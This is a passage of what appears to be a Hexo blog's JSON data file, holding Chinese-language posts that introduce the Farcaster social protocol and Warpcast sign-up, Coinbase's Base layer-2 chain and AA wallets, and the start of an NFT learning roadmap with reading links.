注册好之后，记得保存助记词\n\n5. 登陆网页端（用手机扫码登陆）https://warpcast.com/\n\n6. 去网页端绑定evm钱包\n\n7. 关注名人账号，优化信息流\n\n    @jessepollak base创始人\n\n    @vitalik.eth v神\n\n    ...\n\n    @arespollo pollo 把我关注的都关注一下，顺带也关注我lol\n\n8. 名词科普\n\n    Cast ：一条帖子，理解成推特的一条推文\n\n    Channel ：频道，类似豆瓣的小组，如degen channel\n\n    Warps ：没上链的货币，类比q币，没有价值，主要用途是用来奖励别人、购买空间、租频道\n","slug":"BlockChain/Road/06-Farcaster社交协议","published":1,"updated":"2024-08-01T16:12:24.313Z","comments":1,"layout":"post","photos":[],"_id":"clzbh821o000e2sunfz46epd7","content":"<h1 id=\"Farcaster-社交协议\"><a href=\"#Farcaster-社交协议\" class=\"headerlink\" title=\"Farcaster 社交协议\"></a>Farcaster 社交协议</h1><h2 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h2><p>Farcaster是一个社交协议，作为一个开源的社交关系图谱，支持开发者在这个协议上构建各种应用，其地位可以看作是Base生态的核心，现在的Base链项目的一手消息都是Farcaster上面的。</p>\n<p>Warpcast是支持这个协议的一个客户端，也是大家最常的一个，简单理解就是一个社交APP，类比推特</p>\n<h2 id=\"投资背景\"><a href=\"#投资背景\" class=\"headerlink\" title=\"投资背景\"></a>投资背景</h2><p>2022 年 7 月 13 日，Farcaster 完成 3000 万美元融资，a16z 领投</p>\n<p><img src=\"/./img/image-20240512233007556.png\" alt=\"image-20240512233007556\"></p>\n<h2 id=\"增长与社区\"><a href=\"#增长与社区\" class=\"headerlink\" title=\"增长与社区\"></a>增长与社区</h2><p>Farcaster最早是一些VC、项目方在玩，比较小众，类似知乎早期的精英模式，如V神就是重度用户，并对Farcaster给予了高度评价。btw，base chain创始人Jesse也在上面活跃。</p>\n<p>尽管起步较慢，Farcaster通过其特色功能“<strong>Frame</strong>”在短时间内实现了用户数量的显著增长，日活跃用户从6000人增长到6万人。</p>\n<h2 id=\"Frame功能\"><a href=\"#Frame功能\" class=\"headerlink\" title=\"Frame功能\"></a>Frame功能</h2><p>Farcaster的一个独特功能是“Frame”，它允许开发者使用API和库来开发一些有趣的功能。这种功能可以嵌入到帖子中，类似于小程序，可以调用所有链的dapp(主要是base、zora),极大地增强了帖子的互动性和功能性。</p>\n<p>e.g 你可以在帖子中直接铸造base nft</p>\n<p><img src=\"/./img/image-20240512233135377.png\" alt=\"image-20240512233135377\"></p>\n<h2 id=\"Warpcast玩法\"><a href=\"#Warpcast玩法\" class=\"headerlink\" title=\"Warpcast玩法\"></a>Warpcast玩法</h2><p>玩法流程：</p>\n<ol>\n<li><p>Google Store&#x2F; 国外苹果id，用来下载warpcast</p>\n</li>\n<li><p>一个绑定了可以付款外币信用卡的苹果账户（可国内账户） &#x2F; Google Store账户，因为需要支付5美金</p>\n</li>\n<li><p>点击邀请链接，输入邮箱 <a href=\"https://warpcast.com/~/invite-page/399977?id=fdf16c3d\">https://warpcast.com/~/invite-page/399977?id=fdf16c3d</a></p>\n</li>\n<li><p>注册好之后，记得保存助记词</p>\n</li>\n<li><p>登陆网页端（用手机扫码登陆）<a href=\"https://warpcast.com/\">https://warpcast.com/</a></p>\n</li>\n<li><p>去网页端绑定evm钱包</p>\n</li>\n<li><p>关注名人账号，优化信息流</p>\n<p> @jessepollak base创始人</p>\n<p> @vitalik.eth v神</p>\n<p> …</p>\n<p> @arespollo pollo 把我关注的都关注一下，顺带也关注我lol</p>\n</li>\n<li><p>名词科普</p>\n<p> Cast ：一条帖子，理解成推特的一条推文</p>\n<p> Channel ：频道，类似豆瓣的小组，如degen channel</p>\n<p> Warps ：没上链的货币，类比q币，没有价值，主要用途是用来奖励别人、购买空间、租频道</p>\n</li>\n</ol>\n","excerpt":"","more":"<h1 id=\"Farcaster-社交协议\"><a href=\"#Farcaster-社交协议\" class=\"headerlink\" title=\"Farcaster 社交协议\"></a>Farcaster 社交协议</h1><h2 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h2><p>Farcaster是一个社交协议，作为一个开源的社交关系图谱，支持开发者在这个协议上构建各种应用，其地位可以看作是Base生态的核心，现在的Base链项目的一手消息都是Farcaster上面的。</p>\n<p>Warpcast是支持这个协议的一个客户端，也是大家最常的一个，简单理解就是一个社交APP，类比推特</p>\n<h2 id=\"投资背景\"><a href=\"#投资背景\" class=\"headerlink\" title=\"投资背景\"></a>投资背景</h2><p>2022 年 7 月 13 日，Farcaster 完成 3000 万美元融资，a16z 领投</p>\n<p><img src=\"/./img/image-20240512233007556.png\" alt=\"image-20240512233007556\"></p>\n<h2 id=\"增长与社区\"><a href=\"#增长与社区\" class=\"headerlink\" title=\"增长与社区\"></a>增长与社区</h2><p>Farcaster最早是一些VC、项目方在玩，比较小众，类似知乎早期的精英模式，如V神就是重度用户，并对Farcaster给予了高度评价。btw，base chain创始人Jesse也在上面活跃。</p>\n<p>尽管起步较慢，Farcaster通过其特色功能“<strong>Frame</strong>”在短时间内实现了用户数量的显著增长，日活跃用户从6000人增长到6万人。</p>\n<h2 id=\"Frame功能\"><a href=\"#Frame功能\" class=\"headerlink\" title=\"Frame功能\"></a>Frame功能</h2><p>Farcaster的一个独特功能是“Frame”，它允许开发者使用API和库来开发一些有趣的功能。这种功能可以嵌入到帖子中，类似于小程序，可以调用所有链的dapp(主要是base、zora),极大地增强了帖子的互动性和功能性。</p>\n<p>e.g 你可以在帖子中直接铸造base nft</p>\n<p><img src=\"/./img/image-20240512233135377.png\" alt=\"image-20240512233135377\"></p>\n<h2 id=\"Warpcast玩法\"><a href=\"#Warpcast玩法\" class=\"headerlink\" title=\"Warpcast玩法\"></a>Warpcast玩法</h2><p>玩法流程：</p>\n<ol>\n<li><p>Google Store&#x2F; 国外苹果id，用来下载warpcast</p>\n</li>\n<li><p>一个绑定了可以付款外币信用卡的苹果账户（可国内账户） &#x2F; Google Store账户，因为需要支付5美金</p>\n</li>\n<li><p>点击邀请链接，输入邮箱 <a href=\"https://warpcast.com/~/invite-page/399977?id=fdf16c3d\">https://warpcast.com/~/invite-page/399977?id=fdf16c3d</a></p>\n</li>\n<li><p>注册好之后，记得保存助记词</p>\n</li>\n<li><p>登陆网页端（用手机扫码登陆）<a href=\"https://warpcast.com/\">https://warpcast.com/</a></p>\n</li>\n<li><p>去网页端绑定evm钱包</p>\n</li>\n<li><p>关注名人账号，优化信息流</p>\n<p> @jessepollak base创始人</p>\n<p> @vitalik.eth v神</p>\n<p> …</p>\n<p> @arespollo pollo 把我关注的都关注一下，顺带也关注我lol</p>\n</li>\n<li><p>名词科普</p>\n<p> Cast ：一条帖子，理解成推特的一条推文</p>\n<p> Channel ：频道，类似豆瓣的小组，如degen channel</p>\n<p> Warps ：没上链的货币，类比q币，没有价值，主要用途是用来奖励别人、购买空间、租频道</p>\n</li>\n</ol>\n"},{"title":"07-Base","date":"2024-08-01T16:05:49.000Z","_content":"# Base背景介绍\n\n## 什么是Base\n\nBase是总部位于美国的加密货币交易平台Coinbase于2023年8月9日正式发布的以太坊Layer 2(L2)区块链。作为这家上市公司推出的第一个区块链，它受到了加密货币社区的广泛关注。\n\nBase是与以太坊Layer 2区块链OP Stack上的OPtimism合作开发的，而OP Stack是一个支持OPTimism的标准化开源开发堆栈。Base允许开发者在开发去中心化应用程序(dApps)时能够访问Coinbase的生态系统，该生态系统拥有1.1亿验证用户和超过800亿美元的资产。\nBase的愿景是创建一个所谓的“超级链”，使用Optimism技术来提高性能，并依靠开发者社区的支持和参与来实现这一愿景。\n\n## Base与其他L2对比\n\n1. 企业背景与支持：\n   Base链由Coinbase支持，这是世界上最大的加密货币交易所之一，为Base提供了强大的用户资源和财务支持。\n\n2. 无缝集成与用户体验：\n   Base链与Coinbase的产品、用户和工具实现了无缝集成，提供了易于使用的开发者API和强大的用户访问权限，增强了用户体验。\n\n3. 技术基础与创新：Base链建立在Optimism的OP Stack之上，采用Optimistic Rollups技术，与以太坊主网兼容性强，并计划逐步去中心化。\n\n4. TVL增长与市场表现：\n   尽管Base链起步较晚，但其TVL增长迅速，显示出市场的高度认可。Base的TVL在14天内达到了1亿美元以上，随着链上协议的推出和扩展，TVL很可能会继续增长。\n\n5. 技术基础与创新\n\n    Base链建立在Optimism的OP Stack之上，采用Optimistic Rollups技术，与以太坊主网兼容性强，并计划逐步去中心化。\n\n6. 原生文化与社区活跃度：\n   Base链通过举办链上夏季活动（Onchain Summer Event）、FarCon等活动，成功吸引了社区的关注和参与，增强了其原生文化的影响力。\n\n7. 合作伙伴关系：Base链与Optimism Collective合作，共享治理及收入，这种合作关系为Base链提供了额外的资源和支持。\n\n## Base链的技术创新，AA钱包的应用\n\nBase链作为Coinbase孵化的Layer2网络，其设计初衷在于提供一个安全、低成本且对开发者友好的环境。\n\nAA钱包，即账户抽象（Account Abstraction）钱包，是一种新型的智能合约钱包，它允许用户通过智能合约来管理其资产，从而简化了与区块链互动的过程。\n\nBase链支持AA钱包，这表明它紧跟以太坊的最新发展和创新，同时也展现了其对提供先进用户体验的承诺。AA钱包的核心优势在于它能够实现更高级的用户交互，比如批量交易处理、自动化的Gas费支付，以及更灵活的资产控制。这些特性使得AA钱包对于普通用户和开发者都极具吸引力。\n\n例如，AA钱包允许用户通过一笔交易与多个合约互动，这大大简化了用户在使用去中心化应用（DApps）时的复杂性。\n\n此外，AA钱包还支持使用稳定币支付Gas费，这为用户提供了更多的灵活性和便利性Base链通过整合AA钱包，不仅展示了其对最新区块链技术的支持，还体现了其致力于提供高效、用户友好服务的愿景。随着Base链和AA钱包的进一步发展，预计它们将在推动以太坊生态系统扩展和改善用户体验方面发挥重要作用。\n\n总体而言，Base链的技术架构，以及在安全性、技术成熟度和监管合作方面的努力，共同构成了其在Layer2领域的竞争力。通过这些特性和合作，Base链旨在为用户提供一个高效、低成本且安全的链上体验。\n\n## Base创始人的愿景与展望\n\nJesse Pollak展示了他对Base链开放性、去中心化以及其在推动链上经济和文化传递方面的信念和期望\n\n1. Jesse Pollak认为Meme币是链上经济的重要组成部分，并且很高兴看到更多基于Meme币的扩散，帮助世界进入链上经济。\n2. 他指出Base链上的活力很旺盛，特别是Meme币创作者培育了无数新的方式，让人们加入他们的社区，这创造了一种“寒武纪式的上链实验大爆炸”。\n3. Jesse强调了Base链是“无需许可的”，意味着任何人都可以在上面构建和部署智能合约，Coinbase并没有对合约的单方面控制权，也没有能力冻结Optimistic rollup网络上的资金。\n4. 他提到Base链将逐步去中心化，并在未来几周内分享更多关于Base权力下放的细节。\n5. Jesse还提到Base链上的Meme币已经帮助数千人加入了第2层网络，并将成为下一个百万人的关键。\n6. 在讨论Base生态系统时，Jesse Pollak强调了通过meme项目覆盖广泛的用户群，以及Base链上社交产品的创新和尝试，如Friend.Tech等。\n7. Jesse对Base链的未来发展持乐观态度，并认为Meme币将成为吸引数百万用户加入Base网络的关键驱动力。\n\n## Base链的未来\n\n今年的坎昆升级之后，base又来了新一波的爆发，而base链的创始人在前几天，更是列出了一大批base链的项目，算是明牌表示支持了一众项目，在这些应用背后的，是 Paradigm、a16z、Multicoin、DragonFly、Variant Funds、1confirmation 等一批加密市场知名的 VC 机构。\n\n而这些 VC 机构也因各自的投资风格不同，在 Base 生态分化出了两种特色，一方是以 Paradigm 为首的「赌徒文化」攒局者，另一方是以 a16z 为中心的长期主义派。但他们的目的都只有一个——为 Base 带来更多的真实用户，创建一个活跃繁荣的链上生态。\n","source":"_posts/BlockChain/Road/07-Base.md","raw":"---\ntitle: 07-Base\ndate: 2024-08-02 00:05:49\ntags:\n  - BlockChain\n  - Road\ncategories:\n  - BlockChain\n  - Road\n---\n# Base背景介绍\n\n## 什么是Base\n\nBase是总部位于美国的加密货币交易平台Coinbase于2023年8月9日正式发布的以太坊Layer 2(L2)区块链。作为这家上市公司推出的第一个区块链，它受到了加密货币社区的广泛关注。\n\nBase是与以太坊Layer 2区块链OP Stack上的OPtimism合作开发的，而OP Stack是一个支持OPTimism的标准化开源开发堆栈。Base允许开发者在开发去中心化应用程序(dApps)时能够访问Coinbase的生态系统，该生态系统拥有1.1亿验证用户和超过800亿美元的资产。\nBase的愿景是创建一个所谓的“超级链”，使用Optimism技术来提高性能，并依靠开发者社区的支持和参与来实现这一愿景。\n\n## Base与其他L2对比\n\n1. 企业背景与支持：\n   Base链由Coinbase支持，这是世界上最大的加密货币交易所之一，为Base提供了强大的用户资源和财务支持。\n\n2. 无缝集成与用户体验：\n   Base链与Coinbase的产品、用户和工具实现了无缝集成，提供了易于使用的开发者API和强大的用户访问权限，增强了用户体验。\n\n3. 技术基础与创新：Base链建立在Optimism的OP Stack之上，采用Optimistic Rollups技术，与以太坊主网兼容性强，并计划逐步去中心化。\n\n4. TVL增长与市场表现：\n   尽管Base链起步较晚，但其TVL增长迅速，显示出市场的高度认可。Base的TVL在14天内达到了1亿美元以上，随着链上协议的推出和扩展，TVL很可能会继续增长。\n\n5. 技术基础与创新\n\n    Base链建立在Optimism的OP Stack之上，采用Optimistic Rollups技术，与以太坊主网兼容性强，并计划逐步去中心化。\n\n6. 原生文化与社区活跃度：\n   Base链通过举办链上夏季活动（Onchain Summer Event）、FarCon等活动，成功吸引了社区的关注和参与，增强了其原生文化的影响力。\n\n7. 合作伙伴关系：Base链与Optimism Collective合作，共享治理及收入，这种合作关系为Base链提供了额外的资源和支持。\n\n## Base链的技术创新，AA钱包的应用\n\nBase链作为Coinbase孵化的Layer2网络，其设计初衷在于提供一个安全、低成本且对开发者友好的环境。\n\nAA钱包，即账户抽象（Account Abstraction）钱包，是一种新型的智能合约钱包，它允许用户通过智能合约来管理其资产，从而简化了与区块链互动的过程。\n\nBase链支持AA钱包，这表明它紧跟以太坊的最新发展和创新，同时也展现了其对提供先进用户体验的承诺。AA钱包的核心优势在于它能够实现更高级的用户交互，比如批量交易处理、自动化的Gas费支付，以及更灵活的资产控制。这些特性使得AA钱包对于普通用户和开发者都极具吸引力。\n\n例如，AA钱包允许用户通过一笔交易与多个合约互动，这大大简化了用户在使用去中心化应用（DApps）时的复杂性。\n\n此外，AA钱包还支持使用稳定币支付Gas费，这为用户提供了更多的灵活性和便利性Base链通过整合AA钱包，不仅展示了其对最新区块链技术的支持，还体现了其致力于提供高效、用户友好服务的愿景。随着Base链和AA钱包的进一步发展，预计它们将在推动以太坊生态系统扩展和改善用户体验方面发挥重要作用。\n\n总体而言，Base链的技术架构，以及在安全性、技术成熟度和监管合作方面的努力，共同构成了其在Layer2领域的竞争力。通过这些特性和合作，Base链旨在为用户提供一个高效、低成本且安全的链上体验。\n\n## Base创始人的愿景与展望\n\nJesse Pollak展示了他对Base链开放性、去中心化以及其在推动链上经济和文化传递方面的信念和期望\n\n1. Jesse Pollak认为Meme币是链上经济的重要组成部分，并且很高兴看到更多基于Meme币的扩散，帮助世界进入链上经济。\n2. 他指出Base链上的活力很旺盛，特别是Meme币创作者培育了无数新的方式，让人们加入他们的社区，这创造了一种“寒武纪式的上链实验大爆炸”。\n3. Jesse强调了Base链是“无需许可的”，意味着任何人都可以在上面构建和部署智能合约，Coinbase并没有对合约的单方面控制权，也没有能力冻结Optimistic rollup网络上的资金。\n4. 他提到Base链将逐步去中心化，并在未来几周内分享更多关于Base权力下放的细节。\n5. Jesse还提到Base链上的Meme币已经帮助数千人加入了第2层网络，并将成为下一个百万人的关键。\n6. 在讨论Base生态系统时，Jesse Pollak强调了通过meme项目覆盖广泛的用户群，以及Base链上社交产品的创新和尝试，如Friend.Tech等。\n7. Jesse对Base链的未来发展持乐观态度，并认为Meme币将成为吸引数百万用户加入Base网络的关键驱动力。\n\n## Base链的未来\n\n今年的坎昆升级之后，base又来了新一波的爆发，而base链的创始人在前几天，更是列出了一大批base链的项目，算是明牌表示支持了一众项目，在这些应用背后的，是 Paradigm、a16z、Multicoin、DragonFly、Variant Funds、1confirmation 等一批加密市场知名的 VC 机构。\n\n而这些 VC 机构也因各自的投资风格不同，在 Base 生态分化出了两种特色，一方是以 Paradigm 为首的「赌徒文化」攒局者，另一方是以 a16z 为中心的长期主义派。但他们的目的都只有一个——为 Base 带来更多的真实用户，创建一个活跃繁荣的链上生态。\n","slug":"BlockChain/Road/07-Base","published":1,"updated":"2024-08-01T16:12:33.914Z","comments":1,"layout":"post","photos":[],"_id":"clzbh821p000g2sundurqeh3s","content":"<h1 id=\"Base背景介绍\"><a href=\"#Base背景介绍\" class=\"headerlink\" title=\"Base背景介绍\"></a>Base背景介绍</h1><h2 id=\"什么是Base\"><a href=\"#什么是Base\" class=\"headerlink\" title=\"什么是Base\"></a>什么是Base</h2><p>Base是总部位于美国的加密货币交易平台Coinbase于2023年8月9日正式发布的以太坊Layer 2(L2)区块链。作为这家上市公司推出的第一个区块链，它受到了加密货币社区的广泛关注。</p>\n<p>Base是与以太坊Layer 2区块链OP Stack上的OPtimism合作开发的，而OP Stack是一个支持OPTimism的标准化开源开发堆栈。Base允许开发者在开发去中心化应用程序(dApps)时能够访问Coinbase的生态系统，该生态系统拥有1.1亿验证用户和超过800亿美元的资产。<br>Base的愿景是创建一个所谓的“超级链”，使用Optimism技术来提高性能，并依靠开发者社区的支持和参与来实现这一愿景。</p>\n<h2 id=\"Base与其他L2对比\"><a href=\"#Base与其他L2对比\" class=\"headerlink\" title=\"Base与其他L2对比\"></a>Base与其他L2对比</h2><ol>\n<li><p>企业背景与支持：<br>Base链由Coinbase支持，这是世界上最大的加密货币交易所之一，为Base提供了强大的用户资源和财务支持。</p>\n</li>\n<li><p>无缝集成与用户体验：<br>Base链与Coinbase的产品、用户和工具实现了无缝集成，提供了易于使用的开发者API和强大的用户访问权限，增强了用户体验。</p>\n</li>\n<li><p>技术基础与创新：Base链建立在Optimism的OP Stack之上，采用Optimistic Rollups技术，与以太坊主网兼容性强，并计划逐步去中心化。</p>\n</li>\n<li><p>TVL增长与市场表现：<br>尽管Base链起步较晚，但其TVL增长迅速，显示出市场的高度认可。Base的TVL在14天内达到了1亿美元以上，随着链上协议的推出和扩展，TVL很可能会继续增长。</p>\n</li>\n<li><p>技术基础与创新</p>\n<p> Base链建立在Optimism的OP Stack之上，采用Optimistic Rollups技术，与以太坊主网兼容性强，并计划逐步去中心化。</p>\n</li>\n<li><p>原生文化与社区活跃度：<br>Base链通过举办链上夏季活动（Onchain Summer Event）、FarCon等活动，成功吸引了社区的关注和参与，增强了其原生文化的影响力。</p>\n</li>\n<li><p>合作伙伴关系：Base链与Optimism Collective合作，共享治理及收入，这种合作关系为Base链提供了额外的资源和支持。</p>\n</li>\n</ol>\n<h2 id=\"Base链的技术创新，AA钱包的应用\"><a href=\"#Base链的技术创新，AA钱包的应用\" class=\"headerlink\" title=\"Base链的技术创新，AA钱包的应用\"></a>Base链的技术创新，AA钱包的应用</h2><p>Base链作为Coinbase孵化的Layer2网络，其设计初衷在于提供一个安全、低成本且对开发者友好的环境。</p>\n<p>AA钱包，即账户抽象（Account Abstraction）钱包，是一种新型的智能合约钱包，它允许用户通过智能合约来管理其资产，从而简化了与区块链互动的过程。</p>\n<p>Base链支持AA钱包，这表明它紧跟以太坊的最新发展和创新，同时也展现了其对提供先进用户体验的承诺。AA钱包的核心优势在于它能够实现更高级的用户交互，比如批量交易处理、自动化的Gas费支付，以及更灵活的资产控制。这些特性使得AA钱包对于普通用户和开发者都极具吸引力。</p>\n<p>例如，AA钱包允许用户通过一笔交易与多个合约互动，这大大简化了用户在使用去中心化应用（DApps）时的复杂性。</p>\n<p>此外，AA钱包还支持使用稳定币支付Gas费，这为用户提供了更多的灵活性和便利性Base链通过整合AA钱包，不仅展示了其对最新区块链技术的支持，还体现了其致力于提供高效、用户友好服务的愿景。随着Base链和AA钱包的进一步发展，预计它们将在推动以太坊生态系统扩展和改善用户体验方面发挥重要作用。</p>\n<p>总体而言，Base链的技术架构，以及在安全性、技术成熟度和监管合作方面的努力，共同构成了其在Layer2领域的竞争力。通过这些特性和合作，Base链旨在为用户提供一个高效、低成本且安全的链上体验。</p>\n<h2 id=\"Base创始人的愿景与展望\"><a href=\"#Base创始人的愿景与展望\" class=\"headerlink\" title=\"Base创始人的愿景与展望\"></a>Base创始人的愿景与展望</h2><p>Jesse Pollak展示了他对Base链开放性、去中心化以及其在推动链上经济和文化传递方面的信念和期望</p>\n<ol>\n<li>Jesse Pollak认为Meme币是链上经济的重要组成部分，并且很高兴看到更多基于Meme币的扩散，帮助世界进入链上经济。</li>\n<li>他指出Base链上的活力很旺盛，特别是Meme币创作者培育了无数新的方式，让人们加入他们的社区，这创造了一种“寒武纪式的上链实验大爆炸”。</li>\n<li>Jesse强调了Base链是“无需许可的”，意味着任何人都可以在上面构建和部署智能合约，Coinbase并没有对合约的单方面控制权，也没有能力冻结Optimistic rollup网络上的资金。</li>\n<li>他提到Base链将逐步去中心化，并在未来几周内分享更多关于Base权力下放的细节。</li>\n<li>Jesse还提到Base链上的Meme币已经帮助数千人加入了第2层网络，并将成为下一个百万人的关键。</li>\n<li>在讨论Base生态系统时，Jesse Pollak强调了通过meme项目覆盖广泛的用户群，以及Base链上社交产品的创新和尝试，如Friend.Tech等。</li>\n<li>Jesse对Base链的未来发展持乐观态度，并认为Meme币将成为吸引数百万用户加入Base网络的关键驱动力。</li>\n</ol>\n<h2 id=\"Base链的未来\"><a href=\"#Base链的未来\" class=\"headerlink\" title=\"Base链的未来\"></a>Base链的未来</h2><p>今年的坎昆升级之后，base又来了新一波的爆发，而base链的创始人在前几天，更是列出了一大批base链的项目，算是明牌表示支持了一众项目，在这些应用背后的，是 Paradigm、a16z、Multicoin、DragonFly、Variant Funds、1confirmation 等一批加密市场知名的 VC 机构。</p>\n<p>而这些 VC 机构也因各自的投资风格不同，在 Base 生态分化出了两种特色，一方是以 Paradigm 为首的「赌徒文化」攒局者，另一方是以 a16z 为中心的长期主义派。但他们的目的都只有一个——为 Base 带来更多的真实用户，创建一个活跃繁荣的链上生态。</p>\n","excerpt":"","more":"<h1 id=\"Base背景介绍\"><a href=\"#Base背景介绍\" class=\"headerlink\" title=\"Base背景介绍\"></a>Base背景介绍</h1><h2 id=\"什么是Base\"><a href=\"#什么是Base\" class=\"headerlink\" title=\"什么是Base\"></a>什么是Base</h2><p>Base是总部位于美国的加密货币交易平台Coinbase于2023年8月9日正式发布的以太坊Layer 2(L2)区块链。作为这家上市公司推出的第一个区块链，它受到了加密货币社区的广泛关注。</p>\n<p>Base是与以太坊Layer 2区块链OP Stack上的OPtimism合作开发的，而OP Stack是一个支持OPTimism的标准化开源开发堆栈。Base允许开发者在开发去中心化应用程序(dApps)时能够访问Coinbase的生态系统，该生态系统拥有1.1亿验证用户和超过800亿美元的资产。<br>Base的愿景是创建一个所谓的“超级链”，使用Optimism技术来提高性能，并依靠开发者社区的支持和参与来实现这一愿景。</p>\n<h2 id=\"Base与其他L2对比\"><a href=\"#Base与其他L2对比\" class=\"headerlink\" title=\"Base与其他L2对比\"></a>Base与其他L2对比</h2><ol>\n<li><p>企业背景与支持：<br>Base链由Coinbase支持，这是世界上最大的加密货币交易所之一，为Base提供了强大的用户资源和财务支持。</p>\n</li>\n<li><p>无缝集成与用户体验：<br>Base链与Coinbase的产品、用户和工具实现了无缝集成，提供了易于使用的开发者API和强大的用户访问权限，增强了用户体验。</p>\n</li>\n<li><p>技术基础与创新：Base链建立在Optimism的OP Stack之上，采用Optimistic Rollups技术，与以太坊主网兼容性强，并计划逐步去中心化。</p>\n</li>\n<li><p>TVL增长与市场表现：<br>尽管Base链起步较晚，但其TVL增长迅速，显示出市场的高度认可。Base的TVL在14天内达到了1亿美元以上，随着链上协议的推出和扩展，TVL很可能会继续增长。</p>\n</li>\n<li><p>技术基础与创新</p>\n<p> Base链建立在Optimism的OP Stack之上，采用Optimistic Rollups技术，与以太坊主网兼容性强，并计划逐步去中心化。</p>\n</li>\n<li><p>原生文化与社区活跃度：<br>Base链通过举办链上夏季活动（Onchain Summer Event）、FarCon等活动，成功吸引了社区的关注和参与，增强了其原生文化的影响力。</p>\n</li>\n<li><p>合作伙伴关系：Base链与Optimism Collective合作，共享治理及收入，这种合作关系为Base链提供了额外的资源和支持。</p>\n</li>\n</ol>\n<h2 id=\"Base链的技术创新，AA钱包的应用\"><a href=\"#Base链的技术创新，AA钱包的应用\" class=\"headerlink\" title=\"Base链的技术创新，AA钱包的应用\"></a>Base链的技术创新，AA钱包的应用</h2><p>Base链作为Coinbase孵化的Layer2网络，其设计初衷在于提供一个安全、低成本且对开发者友好的环境。</p>\n<p>AA钱包，即账户抽象（Account Abstraction）钱包，是一种新型的智能合约钱包，它允许用户通过智能合约来管理其资产，从而简化了与区块链互动的过程。</p>\n<p>Base链支持AA钱包，这表明它紧跟以太坊的最新发展和创新，同时也展现了其对提供先进用户体验的承诺。AA钱包的核心优势在于它能够实现更高级的用户交互，比如批量交易处理、自动化的Gas费支付，以及更灵活的资产控制。这些特性使得AA钱包对于普通用户和开发者都极具吸引力。</p>\n<p>例如，AA钱包允许用户通过一笔交易与多个合约互动，这大大简化了用户在使用去中心化应用（DApps）时的复杂性。</p>\n<p>此外，AA钱包还支持使用稳定币支付Gas费，这为用户提供了更多的灵活性和便利性Base链通过整合AA钱包，不仅展示了其对最新区块链技术的支持，还体现了其致力于提供高效、用户友好服务的愿景。随着Base链和AA钱包的进一步发展，预计它们将在推动以太坊生态系统扩展和改善用户体验方面发挥重要作用。</p>\n<p>总体而言，Base链的技术架构，以及在安全性、技术成熟度和监管合作方面的努力，共同构成了其在Layer2领域的竞争力。通过这些特性和合作，Base链旨在为用户提供一个高效、低成本且安全的链上体验。</p>\n<h2 id=\"Base创始人的愿景与展望\"><a href=\"#Base创始人的愿景与展望\" class=\"headerlink\" title=\"Base创始人的愿景与展望\"></a>Base创始人的愿景与展望</h2><p>Jesse Pollak展示了他对Base链开放性、去中心化以及其在推动链上经济和文化传递方面的信念和期望</p>\n<ol>\n<li>Jesse Pollak认为Meme币是链上经济的重要组成部分，并且很高兴看到更多基于Meme币的扩散，帮助世界进入链上经济。</li>\n<li>他指出Base链上的活力很旺盛，特别是Meme币创作者培育了无数新的方式，让人们加入他们的社区，这创造了一种“寒武纪式的上链实验大爆炸”。</li>\n<li>Jesse强调了Base链是“无需许可的”，意味着任何人都可以在上面构建和部署智能合约，Coinbase并没有对合约的单方面控制权，也没有能力冻结Optimistic rollup网络上的资金。</li>\n<li>他提到Base链将逐步去中心化，并在未来几周内分享更多关于Base权力下放的细节。</li>\n<li>Jesse还提到Base链上的Meme币已经帮助数千人加入了第2层网络，并将成为下一个百万人的关键。</li>\n<li>在讨论Base生态系统时，Jesse Pollak强调了通过meme项目覆盖广泛的用户群，以及Base链上社交产品的创新和尝试，如Friend.Tech等。</li>\n<li>Jesse对Base链的未来发展持乐观态度，并认为Meme币将成为吸引数百万用户加入Base网络的关键驱动力。</li>\n</ol>\n<h2 id=\"Base链的未来\"><a href=\"#Base链的未来\" class=\"headerlink\" title=\"Base链的未来\"></a>Base链的未来</h2><p>今年的坎昆升级之后，base又来了新一波的爆发，而base链的创始人在前几天，更是列出了一大批base链的项目，算是明牌表示支持了一众项目，在这些应用背后的，是 Paradigm、a16z、Multicoin、DragonFly、Variant Funds、1confirmation 等一批加密市场知名的 VC 机构。</p>\n<p>而这些 VC 机构也因各自的投资风格不同，在 Base 生态分化出了两种特色，一方是以 Paradigm 为首的「赌徒文化」攒局者，另一方是以 a16z 为中心的长期主义派。但他们的目的都只有一个——为 Base 带来更多的真实用户，创建一个活跃繁荣的链上生态。</p>\n"},{"title":"09-资料","date":"2024-08-01T16:08:01.000Z","_content":"\n","source":"_posts/BlockChain/Road/09-资料.md","raw":"---\ntitle: 09-资料\ndate: 2024-08-02 00:08:01\ntags:\n  - BlockChain\n  - Road\ncategories:\n  - BlockChain\n  - Road\n---\n\n","slug":"BlockChain/Road/09-资料","published":1,"updated":"2024-08-01T16:09:58.215Z","comments":1,"layout":"post","photos":[],"_id":"clzbh821r000l2suneueq2wa7","content":"","excerpt":"","more":""},{"title":"08-NFT","date":"2024-08-01T16:07:29.000Z","_content":"# NFTer-roadmap 2024\n\nNFT 学习路线总结，不断更新。\n\n—— By 浙江大学区块链协会（Zhejiang University BlockChain Association, ZJUBCA）\n\n## 第一层\n\n> 快速入门\n\n-   **历史发展**：\n    -   NFT 圣经：关于非同质化代币的所有知识 [🔗](https://mp.weixin.qq.com/s/Lr-q6cgfcnWzbVqDDjMebQ)\n-   **一些解读**：\n    -   NFT：价值互联网的 HTML [🔗 ](https://mp.weixin.qq.com/s/m8TOUNQypFTJdlK7af6knA)\n    -   深度解析：NFT 有哪些应用场景？非同质化代币最全用例手册 [🔗](https://mp.weixin.qq.com/s/taJs6WYFNY6vVAl0w8HkPg)\n    -   a16z 前合伙人：NFT 让互联网“Ownable” [🔗](https://mp.weixin.qq.com/s/Zukwh08lYzh-2Ai8jXPP6g)\n    -   NFT、Metaverse，与泡泡玛特 [🔗](https://m.theblockbeats.com/news/23129)\n    -   李启威：NFT 的真正价值究竟是什么？ [🔗](https://www.chainnews.com/articles/576303926328.htm)\n    -   问题在于,你站在哪个世界看 NFT ｜预言家周报#114 [🔗](https://mp.weixin.qq.com/s/y7GvQeB46zqE-dVitVpMYw)\n-   **生态现状**：\n    -   NFT 生态大起底：最值得关注的项目都在这里 [🔗](https://m.theblockbeats.com/news/22526)\n    -   全景式解读 NFT 生态全貌，这些重点项目不容错过 [🔗](https://mp.weixin.qq.com/s/r4oxyGw6eB7WdibMNcaOgA)\n-   **精品宝藏**：\n    -   《从 0 到 1: 精通 NFT——一本万能的 NFT 知识图谱》[🔗](https://www.yuque.com/books/share/a8a2de86-76de-4531-8486-ac3d40944557) 🌟\n\n## 第二层\n\n-   **技术原理**（至少了解 